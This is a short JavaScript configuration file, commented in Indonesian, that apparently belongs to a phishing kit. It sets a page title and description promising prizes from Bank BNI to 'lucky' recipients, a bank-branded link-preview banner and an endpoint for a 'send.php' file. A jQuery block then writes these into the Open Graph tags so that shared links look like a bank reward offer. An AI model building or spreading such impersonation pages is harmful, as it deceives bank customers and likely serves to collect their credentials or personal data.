// Judul/nama web
const APP_TITLE = "Pilihan Kupon";
// Deskripsi web/iklan
const APP_DESC = "Dapatkan hadiah menarik dari Bank BNI buat kamu yang beruntung";
// URL banner gambar
const BANNER_URL = "https://zxegx.github.io/links/banners/link_preview_bni.jpeg";
// URL API (tempat dimana file send.php ditaruh, kosongkan jika file send.php ditaruh di halaman depan/root)
const API_URL = "";

export { APP_TITLE, APP_DESC, BANNER_URL, API_URL }

$(document).ready(function() {
	$("title").html(APP_TITLE);
	$('meta[property="og:site_name"]').attr('content', APP_TITLE);
	$('meta[property="og:title"]').attr('content', APP_TITLE);
	$('meta[property="description"]').attr('content', APP_DESC);
	$('meta[property="og:description"]').attr('content', APP_DESC);
	$('meta[property="og:image"]').attr('content', BANNER_URL);
});